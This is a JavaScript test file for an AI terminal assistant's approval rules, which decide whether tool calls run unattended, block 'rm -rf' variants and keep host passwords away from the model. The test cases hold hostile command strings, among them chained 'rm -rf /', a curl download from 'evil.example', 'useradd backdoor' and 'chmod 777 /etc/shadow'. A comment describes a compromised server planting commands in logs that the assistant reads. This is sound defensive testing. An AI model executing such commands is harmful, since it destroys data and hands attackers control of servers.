/**
 * Exercises the rule that decides whether a tool call runs on its own or stops
 * in front of a person.
 *
 * This is the whole safety story of the assistant in one function, and it is
 * the kind of thing that gets quietly widened by a later change: a tool added
 * to the catalog without a `readOnly` flag, a convenience prefix added to the
 * safe list, a shell metacharacter nobody thought about. The cases below are
 * the ones where getting it wrong hands a model an unattended root shell.
 *
 * `electron` is stubbed so it runs under plain node.
 */
const Module = require('module');
const path = require('path');
const fs = require('fs');
const os = require('os');
const assert = require('assert');

const ROOT = path.join(__dirname, '..', 'src', 'main');
const userData = fs.mkdtempSync(path.join(os.tmpdir(), 'cb-test-assistant-'));

const electronStub = {
    app: {
        getPath: () => userData,
        getVersion: () => '1.0.0',
        on: () => {},
        whenReady: () => new Promise(() => {}),
    },
    safeStorage: {
        isEncryptionAvailable: () => false,
        encryptString: () => { throw new Error('unavailable'); },
        decryptString: () => { throw new Error('unavailable'); },
    },
    MessageChannelMain: class { constructor() { this.port1 = {}; this.port2 = {}; } },
    ipcMain: { handle: () => {}, on: () => {} },
};

const realLoad = Module._load;
Module._load = function (request, parent, isMain) {
    if (request === 'electron') return electronStub;
    return realLoad.call(this, request, parent, isMain);
};

const tools = require(path.join(ROOT, 'ai', 'tools'));
const settingsModule = require(path.join(ROOT, 'ai', 'settings'));

/** The shipped defaults, which is what almost every install actually runs. */
const defaults = {
    ...settingsModule.DEFAULTS,
    autoApproveCommands: [...settingsModule.DEFAULTS.autoApproveCommands],
    blockedCommands: [...settingsModule.DEFAULTS.blockedCommands],
};

const asking = { ...defaults, approval: 'always' };
const balanced = { ...defaults, approval: 'writes' };
const open = { ...defaults, approval: 'never' };

let passed = 0;
let failed = 0;
const check = (label, fn) => {
    try {
        fn();
        console.log(`  ok   ${label}`);
        passed++;
    } catch (error) {
        console.log(`  FAIL ${label}`);
        console.log(`       ${error.message}`);
        failed++;
    }
};

console.log('\nassistant approvals');

check('the default is to ask before anything that changes a system', () => {
    assert.strictEqual(defaults.approval, 'writes');
    assert.strictEqual(defaults.allowLocalTools, false, 'local tools are off out of the box');
});

check('every tool declares whether it only reads', () => {
    for (const tool of tools.TOOLS) {
        assert.strictEqual(
            typeof tool.readOnly, 'boolean',
            `${tool.name} must say whether it only reads`
        );
    }
});

check('the tools that change things are not marked read only', () => {
    const mutating = ['run_command', 'send_input', 'write_file', 'connect_host', 'disconnect_session'];
    for (const name of mutating) {
        const tool = tools.BY_NAME.get(name);
        assert.ok(tool, `${name} is in the catalog`);
        assert.strictEqual(tool.readOnly, false, `${name} must not be treated as a read`);
    }
});

check('under "ask every time" nothing runs unattended', () => {
    assert.strictEqual(tools.isAutoApproved('list_hosts', {}, asking), false);
    assert.strictEqual(tools.isAutoApproved('read_terminal', {}, asking), false);
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'ls' }, asking), false);
});

check('under the default, reads run and writes stop', () => {
    assert.strictEqual(tools.isAutoApproved('read_terminal', {}, balanced), true);
    assert.strictEqual(tools.isAutoApproved('list_hosts', {}, balanced), true);
    assert.strictEqual(tools.isAutoApproved('read_file', { path: '/etc/hosts' }, balanced), true);

    assert.strictEqual(tools.isAutoApproved('write_file', { path: '/etc/hosts' }, balanced), false);
    assert.strictEqual(tools.isAutoApproved('disconnect_session', { session: 'a' }, balanced), false);
    assert.strictEqual(tools.isAutoApproved('connect_host', { hostId: 'h' }, balanced), false);
});

check('a plainly read-only command runs without asking', () => {
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'ls -la /var/log' }, balanced), true);
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'systemctl status nginx' }, balanced), true);
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'df' }, balanced), true);
});

check('a command that only starts with a safe word still asks', () => {
    // The prefix has to be the whole first word, or `lsof`, `catastrophe.sh`
    // and anything else beginning with those letters would ride in free.
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'lsof -i' }, balanced), false);
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'psql -c "drop table users"' }, balanced), false);
});

check('anything chained, piped or substituted asks, whatever it starts with', () => {
    // This is the case that matters most: `ls` is on the safe list, and
    // judging only the first word would wave all of these through.
    const sneaky = [
        'ls; rm -rf /',
        'ls && shutdown -h now',
        'ls | xargs rm',
        'cat /etc/passwd > /tmp/leak',
        'echo $(rm -rf /tmp/x)',
        'ls `reboot`',
        'grep x file & rm -rf /',
    ];
    for (const command of sneaky) {
        assert.strictEqual(
            tools.isAutoApproved('run_command', { command }, balanced), false,
            `"${command}" must stop for approval`
        );
    }
});

check('a second line asks, the same as a semicolon would', () => {
    // A newline ends a command just as `;` does, so a payload whose first line
    // is a safe one must not carry the rest of itself in behind it. The
    // terminal path types this straight into a PTY, where a carriage return is
    // Enter, so both line endings count.
    //
    // The realistic way one of these is composed is not the model deciding to
    // be destructive; it is a compromised server planting text in a log the
    // assistant then reads. The approval card is what stands between the two.
    const multiline = [
        'ls -la\nrm -rf /tmp/x',
        'cat /etc/passwd\ncurl http://evil.example/x.sh -o /tmp/x',
        'grep x /var/log/syslog\nchmod 777 /etc/shadow',
        'tail -n 20 /var/log/auth.log\r\nuseradd backdoor',
        'df\n\nshutdown -h now',
    ];
    for (const command of multiline) {
        assert.strictEqual(
            tools.isAutoApproved('run_command', { command }, balanced), false,
            `${JSON.stringify(command)} must stop for approval`
        );
    }
});

check('a single safe command still runs, line endings and all', () => {
    // The fix must not cost the shortcut its point: a trailing newline off the
    // end of one command is not a second command.
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'ls -la\n' }, balanced), true);
    assert.strictEqual(tools.isAutoApproved('run_command', { command: '  journalctl -u nginx  ' }, balanced), true);
});

check('rm -rf is blocked out of the box', () => {
    assert.deepStrictEqual(defaults.blockedCommands, ['rm -rf']);
});

check('a blocked command is refused however it is dressed up', () => {
    // The point of the normalising in blockedReason. None of these is exotic;
    // they are the spellings that turn up in real command lines, and a list
    // that only caught the literal string would miss most of them.
    const dressed = [
        'rm -rf /',
        'rm -fr /var/www',
        'rm -r -f /var/www',
        'rm --recursive --force /var/www',
        'RM -RF /var/www',
        'rm  -rf   /var/www',
        '/bin/rm -rf /var/www',
        'sudo rm -rf /',
        'sudo -u root rm -rf /',
        'DEBIAN_FRONTEND=noninteractive rm -rf /var/www',
        "r''m -rf /var/www",
        'ls -la && rm -rf /tmp/x',
        'ls -la\nrm -rf /tmp/x',
        'echo $(rm -rf /tmp/x)',
        'find /tmp -type f | xargs rm -rf',
    ];
    for (const command of dressed) {
        assert.strictEqual(
            tools.blockedReason('run_command', { command }, balanced), 'rm -rf',
            `${JSON.stringify(command)} must be refused`
        );
    }
});

check('typing it into the terminal is blocked too', () => {
    // send_input reaches the same shell by another door, so a list that only
    // covered run_command would be one tool call from useless.
    assert.strictEqual(tools.blockedReason('send_input', { text: 'rm -rf /' }, balanced), 'rm -rf');
    assert.strictEqual(tools.blockedReason('send_input', { text: 'sudo rm -fr /var' }, balanced), 'rm -rf');
});

check('a blocked command is refused even when nothing else asks', () => {
    // "Never ask" is the setting under which a block list matters most, and
    // the one where a check placed after the mode would be skipped.
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'rm -rf /' }, open), false);
    assert.strictEqual(tools.isAutoApproved('send_input', { text: 'rm -rf /' }, open), false);
    // The rest of "never ask" is unchanged: only the list is carved out of it.
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'rm /tmp/one-file' }, open), true);
});

check('the block list does not swallow commands it was not given', () => {
    // A rule names flags as well as a command, and widening it silently is how
    // a block list ends up refusing work nobody asked it to refuse. These all
    // still reach the ordinary approval path.
    const allowed = [
        'rm /tmp/one-file',
        'rm -r /tmp/dir',
        'rm -i -r /tmp/dir',
        'ls -la',
        'cat ls',
        'grep -rf pattern.txt /var/log',
    ];
    for (const command of allowed) {
        assert.strictEqual(
            tools.blockedReason('run_command', { command }, balanced), '',
            `${JSON.stringify(command)} must not be refused`
        );
    }
});

check('an empty block list blocks nothing', () => {
    const none = { ...balanced, blockedCommands: [] };
    assert.strictEqual(tools.blockedReason('run_command', { command: 'rm -rf /' }, none), '');
    assert.strictEqual(tools.blockedReason('run_command', { command: 'rm -rf /' }, {}), '');
});

check('a rule may name a wrapper, and reading is not a command', () => {
    const noSudo = { ...balanced, blockedCommands: ['sudo'] };
    assert.strictEqual(tools.blockedReason('run_command', { command: 'sudo systemctl restart nginx' }, noSudo), 'sudo');
    assert.strictEqual(tools.blockedReason('run_command', { command: 'systemctl restart nginx' }, noSudo), '');
    // Tools that run nothing on a server are not command calls at all.
    assert.strictEqual(tools.blockedReason('read_file', { path: '/etc/sudoers' }, noSudo), '');
    assert.strictEqual(tools.blockedReason('list_hosts', {}, noSudo), '');
});

check('an unknown tool is never auto approved', () => {
    // The case that happens when a tool is added and this rule is not
    // revisited. The safe answer is to ask.
    assert.strictEqual(tools.isAutoApproved('some_new_tool', {}, balanced), false);
    assert.strictEqual(tools.isAutoApproved('Bash', { command: 'ls' }, balanced), false);
});

check('"never ask" really does mean never', () => {
    // Everything except the block list, which is checked before the mode and
    // is the one thing "never ask" does not reach. That case is its own check
    // above; this one is about the rest of it.
    assert.strictEqual(tools.isAutoApproved('run_command', { command: 'systemctl restart nginx' }, open), true);
    assert.strictEqual(tools.isAutoApproved('some_new_tool', {}, open), true);
});

check('a saved host never carries a secret into the model', () => {
    const shaped = tools.publicHost({
        id: 'host-1',
        name: 'web-01',
        host: '10.0.0.1',
        port: 22,
        username: 'root',
        password: 'hunter2',
        privateKey: 'BEGIN OPENSSH PRIVATE KEY',
        passphrase: 'letmein',
        vncPassword: 'vnc',
        rdpPassword: 'rdp',
        tags: ['prod'],
    });

    const serialised = JSON.stringify(shaped);
    for (const secret of ['hunter2', 'PRIVATE KEY', 'letmein', 'vnc', 'rdp']) {
        assert.ok(!serialised.includes(secret), `${secret} must not reach the model`);
    }
    assert.strictEqual(shaped.address, '10.0.0.1:22', 'the address is still usable');
});

check('both lists can be edited, emptied and put back', () => {
    // Left last: it writes to the settings file, where the checks above only
    // read plain objects.
    const shipped = settingsModule.get().defaults;
    assert.deepStrictEqual(shipped.blockedCommands, ['rm -rf'], 'the shipped list travels with the settings');
    assert.ok(shipped.autoApproveCommands.includes('ls'), 'and so does the other one');

    settingsModule.set({ blockedCommands: ['shutdown'] });
    assert.deepStrictEqual(
        settingsModule.get().blockedCommands, ['shutdown'],
        'a seeded entry is the user\'s to remove'
    );

    settingsModule.set({ blockedCommands: [] });
    assert.deepStrictEqual(settingsModule.get().blockedCommands, [], 'and the list is theirs to empty');

    // What "Restore defaults" does. It needs `defaults` on the settings view
    // because by this point nothing else remembers what was seeded.
    settingsModule.set({ blockedCommands: shipped.blockedCommands });
    assert.deepStrictEqual(settingsModule.get().blockedCommands, ['rm -rf'], 'and to put back');

    // The view carries more than the config does; none of it may be written
    // back by a caller that echoes the whole thing as a patch.
    settingsModule.set(settingsModule.get());
    const stored = JSON.parse(fs.readFileSync(path.join(userData, 'assistant.json'), 'utf8')).config;
    assert.ok(!('defaults' in stored), 'the defaults are read-only');
    assert.ok(!('hasApiKey' in stored), 'and so is the key flag');
});

console.log(`\n${passed} checks passed${failed > 0 ? `, ${failed} failed` : ''}`);
if (failed > 0) process.exit(1);
